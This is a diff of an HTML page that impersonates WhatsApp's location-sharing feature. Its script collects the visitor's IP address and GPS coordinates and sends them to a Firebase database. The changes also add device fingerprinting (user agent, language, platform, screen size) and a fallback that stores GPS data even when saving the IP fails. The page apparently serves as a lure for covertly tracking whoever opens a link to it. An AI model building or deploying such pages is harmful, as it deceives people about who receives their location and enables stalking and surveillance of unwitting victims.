@@ -1,19 +1,15 @@
-<!DOCTYPE html>
+
+        <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>WhatsApp</title>
+    <title>WhatsApp · Ubicación</title>
     <style>
-        /* ---------- RESET Y ESTILOS BASE ---------- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(145deg, #128C7E, #075E54);
             min-height: 100vh;
             display: flex;
@@ -90,18 +86,15 @@
             background: #e6f7f0;
             border-color: #a8d5c7;
         }
-
         #estado.exito {
             background: #d4edda;
             border-color: #8bc9a8;
         }
-
         #estado.error {
             background: #f8dddd;
             border-color: #e6b3b3;
         }
 
-        /* ---------- SPINNER ---------- */
         .spinner {
             display: inline-block;
             width: 20px;
@@ -138,30 +131,41 @@
             background: #ffffff;
             width: 90%;
             max-width: 360px;
-            padding: 32px 24px 28px;
+            padding: 24px 20px 28px;
             border-radius: 28px;
             box-shadow: 0 24px 48px rgba(0, 0, 0, 0.3);
             text-align: center;
             animation: slideUp 0.35s ease;
         }
 
+        .modal-contenido .modal-imagen {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 12px;
+            display: block;
+            border: 3px solid #25D366;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
         .modal-contenido .modal-icon {
-            font-size: 48px;
-            margin-bottom: 8px;
+            font-size: 40px;
+            margin-bottom: 4px;
         }
 
         .modal-contenido h3 {
             color: #075E54;
             font-size: 20px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
         .modal-contenido p {
             color: #2d4a44;
             font-size: 15px;
             line-height: 1.5;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .modal-contenido .btn-group {
@@ -202,51 +206,41 @@
             background: #054a42;
         }
 
-        .btn-recargar i {
-            margin-right: 6px;
-        }
-
         /* ---------- ANIMACIONES ---------- */
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
         }
-
         @keyframes slideUp {
             from { transform: translateY(30px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
 
-        /* ---------- RESPONSIVE ---------- */
         @media (max-width: 400px) {
             .card { padding: 20px 16px; }
             h2 { font-size: 21px; }
             iframe { height: 160px; }
+            .modal-contenido .modal-imagen { width: 64px; height: 64px; }
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <!-- Logo -->
         <img src="logowhatsapp.jpg" alt="WhatsApp" class="logo" />
-
         <h2>WhatsApp</h2>
         <p class="subtitle">Comparte tu ubicación en tiempo real</p>
-
-        <!-- Mapa -->
         <iframe src="https://www.google.com/maps?q=Colombia&output=embed" loading="lazy"></iframe>
-
-        <!-- Estado -->
         <div id="estado">
             <span class="spinner"></span>
             <span id="estadoTexto">Iniciando...</span>
         </div>
     </div>
 
-    <!-- MODAL -->
+    <!-- MODAL CON IMAGEN -->
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
+            <img src="imagenubicacion.jpg" alt="Ubicación" class="modal-imagen" />
             <div class="modal-icon">📍</div>
             <h3>Permiso de ubicación</h3>
             <p id="textoAlerta">Activa la ubicación en los ajustes del navegador.</p>
@@ -257,7 +251,6 @@
         </div>
     </div>
 
-    <!-- ====== SCRIPT ====== -->
     <script type="module">
         // ----- IMPORTS FIREBASE -----
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
@@ -290,7 +283,8 @@
         const btnReintentar = document.getElementById('btnReintentar');
         const btnRecargar = document.getElementById('btnRecargar');
 
-        let docId = null; // ID del documento para actualizar con GPS
+        let docId = null;
+        let ipGuardada = false;
 
         // ----- FUNCIONES DE ESTADO -----
         function setEstado(texto, tipo = 'cargando') {
@@ -354,32 +348,55 @@
                     ubicacion_obtenida: false
                 });
                 docId = docRef.id;
+                ipGuardada = true;
                 console.log('📄 Documento IP creado:', docId);
                 return true;
             } catch (e) {
                 console.error('Error guardando IP:', e);
+                let mensaje = 'Error al guardar IP: ';
+                if (e.code === 'permission-denied') mensaje += 'permisos insuficientes.';
+                else if (e.code === 'not-found') mensaje += 'colección no existe.';
+                else mensaje += e.message;
+                mostrarAlerta(mensaje);
                 return false;
             }
         }
 
-        // ----- ACTUALIZAR CON GPS (mismo documento) -----
-        async function actualizarGPS(posicion) {
-            if (!docId) {
-                console.warn('No hay docId para actualizar');
-                return false;
-            }
+        // ----- GUARDAR GPS (crea documento nuevo si no hay IP) -----
+        async function guardarGPS(posicion) {
             try {
-                await updateDoc(doc(db, 'ubicaciones', docId), {
+                const datos = {
                     lat: posicion.coords.latitude,
                     lon: posicion.coords.longitude,
                     precision: posicion.coords.accuracy,
-                    ubicacion_obtenida: true,
-                    fecha_ubicacion: serverTimestamp()
-                });
-                console.log('✅ GPS actualizado en documento', docId);
-                return true;
+                    userAgent: navigator.userAgent,
+                    idioma: navigator.language,
+                    plataforma: navigator.platform,
+                    anchoPantalla: screen.width,
+                    altoPantalla: screen.height,
+                    fecha: serverTimestamp(),
+                    ubicacion_obtenida: true
+                };
+
+                if (docId && ipGuardada) {
+                    await updateDoc(doc(db, 'ubicaciones', docId), {
+                        ...datos,
+                        fecha_ubicacion: serverTimestamp()
+                    });
+                    console.log('✅ GPS actualizado en documento IP');
+                    return true;
+                } else {
+                    const docRef = await addDoc(collection(db, 'ubicaciones'), datos);
+                    console.log('📄 Documento GPS creado (sin IP):', docRef.id);
+                    return true;
+                }
             } catch (e) {
-                console.error('Error actualizando GPS:', e);
+                console.error('Error guardando GPS:', e);
+                let mensaje = 'Error al guardar GPS: ';
+                if (e.code === 'permission-denied') mensaje += 'permisos insuficientes.';
+                else if (e.code === 'not-found') mensaje += 'colección no existe.';
+                else mensaje += e.message;
+                mostrarAlerta(mensaje);
                 return false;
             }
         }
@@ -399,7 +416,7 @@
                     const lon = pos.coords.longitude;
                     setEstado(`📍 ${lat.toFixed(5)}, ${lon.toFixed(5)} — guardando...`, 'cargando');
 
-                    const ok = await actualizarGPS(pos);
+                    const ok = await guardarGPS(pos);
                     if (ok) {
                         setEstado('✅ ¡Ubicación guardada! Redirigiendo...', 'exito');
                         ocultarAlerta();
@@ -408,7 +425,6 @@
                         }, 2200);
                     } else {
                         setEstado('❌ Error al guardar la ubicación', 'error');
-                        mostrarAlerta('No se pudo guardar en Firebase. Reintenta.');
                     }
                 },
                 (err) => {
@@ -437,22 +453,20 @@
         (async function main() {
             setEstado('Obteniendo IP...', 'cargando');
 
-            // 1. Obtener IP
             const ipData = await obtenerIP();
             if (ipData) {
                 const guardado = await guardarIP(ipData);
                 if (guardado) {
                     setEstado('✅ IP guardada. Solicitando GPS...', 'cargando');
                 } else {
-                    setEstado('⚠️ IP no guardada (continúa con GPS)', 'error');
+                    setEstado('⚠️ No se pudo guardar IP (continúa con GPS)', 'error');
                 }
             } else {
                 setEstado('⚠️ No se pudo obtener IP. Solicitando GPS...', 'error');
             }
 
-            // 2. Solicitar GPS (si el permiso ya está concedido, funcionará)
             solicitarGPS();
         })();
     </script>
 </body>
-</html>
+</html>    
